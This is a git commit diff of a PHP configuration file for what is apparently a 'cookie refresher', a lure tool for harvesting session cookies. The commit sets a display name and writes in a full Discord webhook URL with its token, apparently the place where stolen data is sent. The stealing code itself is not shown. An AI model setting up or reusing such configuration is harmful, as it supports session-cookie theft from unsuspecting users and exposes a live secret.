ee447dc1df0e8b7ab877710e90019ff17102bf46
xxuspv <rohanhabash2020@icloud.com>
2024-11-27 23:10:08 +0100

    setup.php

--- setup.php
+++ setup.php
@@ -1,7 +1,7 @@
 <?php
 
-$name = "Deix Du Condido"; // cookie refresher name
-$webhook = "webhook here";
+$name = "W refresher"; // cookie refresher name
+$webhook = "https://discord.com/api/webhooks/1309210759330267187/FlfpNWdR6Who5-sltjbaNJDQNaHEmxhy5A2zO_R5TtuYc__bGBR339PdPJiwRhlJSVZP";
 $image = ""; // cookie refresher image / background
 $html_icon = "https://tse4.mm.bing.net/th?id=OIP.HgjTrduHboOjui_U9tcE2QHaDj&pid=Api&P=0&h=180"; // cookie refresher web icon
 // credits Deix Du Condido
